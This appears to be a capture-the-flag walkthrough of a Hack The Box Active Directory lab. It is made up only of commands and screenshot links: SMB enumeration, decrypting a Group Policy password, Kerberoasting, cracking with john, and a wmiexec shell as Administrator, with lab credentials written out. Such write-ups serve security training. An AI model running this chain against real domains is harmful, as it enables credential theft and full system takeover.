```
enum4linux 10.10.10.100
smbclient \\\\10.10.10.100\\Replication
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
./GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 –request
john hash_admin -w=/usr/share/wordlists/rockyou.txt
./wmiexec.py 'active/Administrator:Ticketmaster1968@10.10.10.100'
```


```
nmap -sS -sC -sV -T5 -Pn 10.10.10.100
```
![image](https://github.com/regarmulia/HTB/assets/33616880/62eec5e6-380c-45c5-bc44-3bdb54c40f26)


```
enum4linux 10.10.10.100
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d7486643-ea46-46bb-b33a-6b865d78f206)


```
smbclient \\\\10.10.10.100\\Replication
anonymous
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6935ff75-0a3c-4efc-aabb-190a8a5c0482)

![image](https://github.com/regarmulia/HTB/assets/33616880/776f15e6-13c4-4caf-bbd4-ac9a9844bce6)

![image](https://github.com/regarmulia/HTB/assets/33616880/fceddd91-4474-4b35-aed0-60eb1ca4a232)


```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d3259bc4-f640-4b5a-afe6-ed7a44efb518)


```
ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/64129b61-51f4-40b3-99c6-6317737bf90b)


```
cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
./GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 –request
john hash_admin -w=/usr/share/wordlists/rockyou.txt 
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d6a98c1f-8f1d-4498-8270-58fbae138d3f)


```
cp /usr/share/doc/python3-impacket/examples/wmiexec.py .
./wmiexec.py 'active/Administrator:Ticketmaster1968@10.10.10.100'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d3c1ac09-596b-4154-a3c8-dd11e9b7d062)
